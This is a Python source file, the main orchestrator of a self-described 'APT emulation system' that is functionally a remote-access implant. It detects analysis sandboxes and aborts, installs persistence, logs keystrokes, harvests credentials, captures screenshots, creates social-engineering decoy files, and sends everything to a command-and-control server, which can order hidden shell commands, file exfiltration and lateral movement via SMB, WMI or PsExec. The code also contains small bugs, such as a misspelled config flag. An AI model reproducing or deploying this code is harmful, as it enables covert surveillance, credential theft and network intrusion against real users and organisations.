# Enhanced APT Emulation System - Main Entry Point

import os
import time
import json
import sys
import threading
from datetime import datetime
from pynput.keyboard import Listener, Key

# Import configuration
from config import (
    TRANSMISSION_INTERVAL, LOG_FILE, BELIEVABLE_FILES, 
    SILENT_MODE, DEBUG_MODE, CREDENTIAL_HARVEST_ENABLED,
    SCREEN_CAPTURE_ENABLED, LATERAL_MOVEMENT_ENABLED,
    EVASION_ENABLED, PLUGIN_SYSTEM_ENABLED, MITRE_LOGGING_ENABLED,
    CAMPAIGN_MODE_ENABLED
)

# Import core modules
from core import (
    stealth_manager, c2_client, persistence_manager, recon_manager,
    credential_harvester, screen_capture, lateral_movement,
    evasion_manager, plugin_manager, mitre_logger,
    reporting_manager, campaign_orchestrator
)

class APTEmulator:
    """Main APT emulation orchestrator"""
    
    def __init__(self):
        self.session_data = {}
        self.keylog_buffer = []
        self.is_running = True
        self.screenshot_buffer = []
        self.credential_buffer = []
        # Get session ID from C2 client
        self.session_id = c2_client.session_id
        
    def initialize(self):
        """Initialize the APT emulation system"""
        try:
            # Initialize stealth mechanisms first
            if not stealth_manager.initialize_stealth():
                if DEBUG_MODE:
                    print("Warning: Stealth initialization failed")
            
            # Check for analysis environment
            if stealth_manager.should_abort_execution():
                if DEBUG_MODE:
                    print("Analysis environment detected, aborting execution")
                return False
            
            # Initialize evasion if enabled
            if EVASION_ENABLED:
                evasion_manager.initialize_evasion()
            
            # Perform initial system reconnaissance
            self.session_data = recon_manager.get_comprehensive_info()
            
            # Log initial system information
            self._log_session_data()
            
            # Install persistence mechanisms
            if persistence_manager.install_all_persistence():
                if DEBUG_MODE:
                    print("Persistence mechanisms installed")
            
            # Load plugins if enabled
            if PLUGIN_SYSTEM_ENABLED:
                self._initialize_plugins()
            
            # Send initial heartbeat to C2
            c2_client.heartbeat(self.session_data.get('basic', {}))
            
            # Log MITRE technique
            if MITRE_LOGGING_ENABLED:
                mitre_logger.log_technique('T1082', True, {
                    'method': 'comprehensive_discovery',
                    'info_categories': len(self.session_data)
                })
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Initialization failed: {e}")
                )
            return False
    
    def _initialize_plugins(self):
        """Initialize plugin system"""
        try:
            plugin_manager.load_all_plugins()
            if DEBUG_MODE:
                print(f"Loaded {len(plugin_manager.get_all_plugins())} plugins")
            
            # Trigger startup hooks
            plugin_manager.trigger_global_hook('on_startup', {
                'timestamp': datetime.now().isoformat()
            })
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Plugin initialization failed: {e}")
                )
    
    def _log_session_data(self):
        """Log session data to file"""
        try:
            with open(LOG_FILE, 'w') as f:
                json.dump(self.session_data, f, indent=2, default=str)
            
            if DEBUG_MODE:
                print(f"Session data logged to {LOG_FILE}")
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Session logging failed: {e}")
                )
    
    def create_decoy_files(self):
        """Create believable files for social engineering"""
        try:
            created_files = []
            
            for filename, content in BELIEVABLE_FILES.items():
                try:
                    with open(filename, 'w') as f:
                        f.write(content)
                    created_files.append(filename)
                    
                    if DEBUG_MODE:
                        print(f"Created decoy file: {filename}")
                        
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Failed to create {filename}: {e}")
                        )
            
            return created_files
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Decoy file creation failed: {e}")
                )
            return []
    
    def start_keylogger(self):
        """Start enhanced keylogging with stealth features"""
        try:
            def on_key_press(key):
                try:
                    # Log the key with timestamp
                    key_data = {
                        'timestamp': datetime.now().isoformat(),
                        'key': None,
                        'type': 'keypress'
                    }
                    
                    if hasattr(key, 'char') and key.char is not None:
                        key_data['key'] = key.char
                    else:
                        key_data['key'] = str(key)
                    
                    self.keylog_buffer.append(key_data)
                    
                    # Flush buffer periodically
                    if len(self.keylog_buffer) >= 100:
                        self._flush_keylog_buffer()
                        
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Keylog error: {e}")
                        )
            
            # Start the keylogger
            with Listener(on_press=on_key_press) as listener:
                if DEBUG_MODE:
                    print("Keylogger started")
                
                # Keep the keylogger running
                while self.is_running:
                    time.sleep(1)
                    
                    # Periodic buffer flush
                    if len(self.keylog_buffer) > 0:
                        stealth_manager.add_jitter(0.5, 2)
                        self._flush_keylog_buffer()
                
                listener.join()
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Keylogger failed: {e}")
                )
    
    def _flush_keylog_buffer(self):
        """Flush keylog buffer to storage and C2"""
        try:
            if not self.keylog_buffer:
                return
            
            # Append to log file
            try:
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        existing_data = json.load(f)
                else:
                    existing_data = {}
                
                if 'keylog' not in existing_data:
                    existing_data['keylog'] = []
                
                existing_data['keylog'].extend(self.keylog_buffer)
                
                with open(LOG_FILE, 'w') as f:
                    json.dump(existing_data, f, indent=2, default=str)
                    
            except Exception as e:
                if DEBUG_MODE:
                    stealth_manager.safe_execute(
                        lambda: print(f"Keylog file write failed: {e}")
                    )
            
            # Send to C2 server - format matches /api/agent/keylog/route.ts
            keylog_data = {
                'keyData': json.dumps(self.keylog_buffer.copy()),
                'timestamp': datetime.now().isoformat()
            }
            
            c2_client.send_data(keylog_data, endpoint="/keylog")
            
            # Clear buffer
            self.keylog_buffer.clear()
            
            # Log MITRE technique
            if MITRE_LOGGING_ENABLED:
                mitre_logger.log_technique('T1056.001', True, {
                    'keys_logged': len(self.keylog_buffer)
                })
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Keylog buffer flush failed: {e}")
                )
    
    def harvest_credentials(self):
        """Harvest credentials from the system"""
        if not CREDENTIAL_HARVEST_ENABLED:
            return None
        
        try:
            credentials = credential_harvester.harvest_all_credentials()
            self.credential_buffer.extend(credentials.get('credentials', []))
            
            # Send to C2 - format matches /api/agent/credentials/route.ts
            if credentials.get('credentials'):
                cred_data = {
                    'credentials': credentials.get('credentials'),
                    'timestamp': datetime.now().isoformat()
                }
                c2_client.send_data(cred_data, endpoint="/credentials")
            
            if MITRE_LOGGING_ENABLED:
                mitre_logger.log_technique('T1555', True, {
                    'credentials_found': len(credentials.get('credentials', []))
                })
            
            return credentials
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Credential harvesting failed: {e}")
                )
            return None
    
    def take_screenshot(self):
        """Capture a screenshot"""
        if not SCREEN_CAPTURE_ENABLED:
            return None
        
        try:
            screenshot = screen_capture.take_screenshot()
            
            if screenshot and screenshot.get('image_data'):
                self.screenshot_buffer.append(screenshot)
                
                # Send to C2 - format matches /api/agent/screenshot/route.ts
                screenshot_data = {
                    'filename': screenshot.get('filename', f'screenshot_{int(time.time())}.png'),
                    'fileSize': screenshot.get('file_size', 0),
                    'mimeType': 'image/png',
                    'fileHash': screenshot.get('hash')
                }
                c2_client.send_data(screenshot_data, endpoint="/screenshot")
            
            if MITRE_LOGGING_ENABLED:
                mitre_logger.log_technique('T1113', True, screenshot.get('dimensions'))
            
            return screenshot
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Screenshot capture failed: {e}")
                )
            return None
    
    def discover_network_targets(self):
        """Discover network targets for lateral movement"""
        if not LATERAL_MOVEMENT_ENABLED:
            return None
        
        try:
            targets = lateral_movement.discover_network_targets()
            
            if MITRE_LOGGING_ENABLED:
                mitre_logger.log_technique('T1018', True, {
                    'hosts_found': len(targets.get('hosts', [])),
                    'shares_found': len(targets.get('shares', []))
                })
            
            return targets
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Network discovery failed: {e}")
                )
            return None
    
    def start_c2_communication_loop(self):
        """Start the main C2 communication loop"""
        try:
            while self.is_running:
                try:
                    # Send heartbeat
                    c2_client.heartbeat(self.session_data.get('basic', {}))
                    
                    # Check for commands
                    commands = c2_client.receive_commands()
                    if commands:
                        self._process_c2_commands(commands)
                    
                    # Send any buffered data
                    if self.keylog_buffer:
                        self._flush_keylog_buffer()
                    
                    # Wait with jitter
                    stealth_manager.add_jitter(
                        TRANSMISSION_INTERVAL * 0.8,
                        TRANSMISSION_INTERVAL * 1.2
                    )
                    
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"C2 communication error: {e}")
                        )
                    
                    # Wait before retry
                    stealth_manager.add_jitter(30, 60)
                    
        except KeyboardInterrupt:
            self.shutdown()
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"C2 loop failed: {e}")
                )
    
    def _process_c2_commands(self, commands):
        """Process commands received from C2 server"""
        try:
            if not isinstance(commands, list):
                commands = [commands]
            
            for command in commands:
                cmd_type = command.get('type', '')
                
                if cmd_type == 'collect_info':
                    # Refresh system information
                    self.session_data = recon_manager.get_comprehensive_info()
                    c2_client.send_data(self.session_data, endpoint="/info")
                
                elif cmd_type == 'exfiltrate_file':
                    file_path = command.get('path', '')
                    if file_path and os.path.exists(file_path):
                        c2_client.exfiltrate_file(file_path)
                
                elif cmd_type == 'execute_command':
                    cmd = command.get('command', '')
                    if cmd:
                        self._execute_system_command(cmd)
                
                elif cmd_type == 'harvest_credentials':
                    if CREDITAL_HARVEST_ENABLED:
                        credentials = self.harvest_credentials()
                        c2_client.send_data(credentials, endpoint="/credentials")
                
                elif cmd_type == 'take_screenshot':
                    if SCREEN_CAPTURE_ENABLED:
                        screenshot = self.take_screenshot()
                        c2_client.send_data(screenshot, endpoint="/screenshot")
                
                elif cmd_type == 'discover_targets':
                    if LATERAL_MOVEMENT_ENABLED:
                        targets = self.discover_network_targets()
                        c2_client.send_data(targets, endpoint="/targets")
                
                elif cmd_type == 'lateral_move':
                    if LATERAL_MOVEMENT_ENABLED:
                        target = command.get('target', '')
                        method = command.get('method', 'smb')
                        result = self._execute_lateral_movement(target, method)
                        c2_client.send_data(result, endpoint="/lateral_result")
                
                elif cmd_type == 'generate_report':
                    report = reporting_manager.generate_session_report(self.session_data)
                    c2_client.send_data(report, endpoint="/report")
                
                elif cmd_type == 'start_campaign':
                    if CAMPAIGN_MODE_ENABLED:
                        campaign_type = command.get('campaign_type', 'full')
                        self._execute_campaign(campaign_type)
                
                elif cmd_type == 'shutdown':
                    self.shutdown()
                
                elif cmd_type == 'update_persistence':
                    persistence_manager.install_all_persistence()
                
                else:
                    if DEBUG_MODE:
                        print(f"Unknown command type: {cmd_type}")
                        
                # Trigger plugin hooks
                if PLUGIN_SYSTEM_ENABLED:
                    plugin_manager.trigger_global_hook('on_command', {
                        'command_type': cmd_type,
                        'command_data': command
                    })
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Command processing failed: {e}")
                )
    
    def _execute_system_command(self, command):
        """Execute system command and return results"""
        try:
            import subprocess
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
            
            command_result = {
                'type': 'command_result',
                'command': command,
                'returncode': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'timestamp': datetime.now().isoformat()
            }
            
            c2_client.send_data(command_result, endpoint="/command_result")
            
            # Log MITRE technique
            if MITRE_LOGGING_ENABLED:
                mitre_logger.log_technique('T1059.003', result.returncode == 0, {
                    'command': command
                })
            
        except Exception as e:
            error_result = {
                'type': 'command_error',
                'command': command,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
            
            c2_client.send_data(error_result, endpoint="/command_result")
    
    def _execute_lateral_movement(self, target, method='smb'):
        """Execute lateral movement to target"""
        try:
            if method == 'smb':
                result = lateral_movement.move_via_smb(
                    target, 'C$', 'payload.exe'
                )
            elif method == 'wmi':
                result = lateral_movement.move_via_wmi(target, 'payload.exe')
            elif method == 'psexec':
                result = lateral_movement.move_via_psexec(target, 'payload.exe')
            else:
                result = {'success': False, 'error': 'Unknown method'}
            
            # Log MITRE technique
            if MITRE_LOGGING_ENABLED:
                mitre_logger.log_technique('T1021.002', result.get('success', False), {
                    'target': target,
                    'method': method
                })
            
            return result
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _execute_campaign(self, campaign_type):
        """Execute a predefined campaign"""
        try:
            # Create campaign orchestrator
            orchestrator = campaign_orchestrator
            
            if campaign_type == 'initial_access':
                campaign_orchestrator = campaign_orchestrator.__class__(
                    f"campaign_initial_{int(time.time())}"
                )
                from core.campaign import CampaignTemplates
                CampaignTemplates.create_initial_access_campaign(campaign_orchestrator)
            elif campaign_type == 'credential_theft':
                from core.campaign import CampaignTemplates
                CampaignTemplates.create_credential_theft_campaign(campaign_orchestrator)
            elif campaign_type == 'lateral_movement':
                from core.campaign import CampaignTemplates
                CampaignTemplates.create_lateral_movement_campaign(campaign_orchestrator)
            elif campaign_type == 'full':
                from core.campaign import CampaignTemplates
                CampaignTemplates.create_full_assessment_campaign(campaign_orchestrator)
            
            # Execute campaign
            results = campaign_orchestrator.execute_campaign()
            
            # Send results to C2
            c2_client.send_data(results, endpoint="/campaign_results")
            
            return results
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Campaign execution failed: {e}")
                )
            return {'error': str(e)}
    
    def run_campaign(self):
        """Run the complete APT campaign"""
        try:
            # Initialize the system
            if not self.initialize():
                return False
            
            # Create decoy files
            self.create_decoy_files()
            
            # Check if session is active (basic implementation)
            screen_active = self.session_data.get('basic', {}).get('username') is not None
            
            if screen_active:
                # Start keylogger in background thread
                import threading
                
                keylogger_thread = threading.Thread(
                    target=self.start_keylogger,
                    daemon=True
                )
                keylogger_thread.start()
                
                if DEBUG_MODE:
                    print("APT campaign started - keylogger active")
            
            # Start main C2 communication loop
            self.start_c2_communication_loop()
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Campaign execution failed: {e}")
                )
            return False
    
    def shutdown(self):
        """Gracefully shutdown the APT emulator"""
        try:
            self.is_running = False
            
            # Flush any remaining keylog data
            if self.keylog_buffer:
                self._flush_keylog_buffer()
            
            # Trigger plugin shutdown hooks
            if PLUGIN_SYSTEM_ENABLED:
                plugin_manager.trigger_global_hook('on_shutdown', {
                    'timestamp': datetime.now().isoformat()
                })
                plugin_manager.shutdown_all_plugins()
            
            # Stop evasion
            if EVASION_ENABLED:
                evasion_manager.evasion_active = False
            
            # Stop screen streaming
            if SCREEN_CAPTURE_ENABLED:
                screen_capture.stop_screen_stream()
            
            # Generate final report
            if MITRE_LOGGING_ENABLED:
                report = reporting_manager.generate_session_report(self.session_data)
                mitre_logger.log_technique('T1070', True, {
                    'report_generated': True
                })
            
            # Send final status to C2
            shutdown_data = {
                'type': 'shutdown',
                'timestamp': datetime.now().isoformat(),
                'reason': 'normal_shutdown'
            }
            
            c2_client.send_data(shutdown_data, endpoint="/status")
            
            if DEBUG_MODE:
                print("APT emulator shutdown complete")
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Shutdown failed: {e}")
                )

def main():
    """Main entry point"""
    try:
        # Create and run APT emulator
        emulator = APTEmulator()
        emulator.run_campaign()
        
    except KeyboardInterrupt:
        if DEBUG_MODE:
            print("Execution interrupted by user")
    except Exception as e:
        if DEBUG_MODE:
            stealth_manager.safe_execute(
                lambda: print(f"Main execution failed: {e}")
            )

if __name__ == '__main__':
    main()
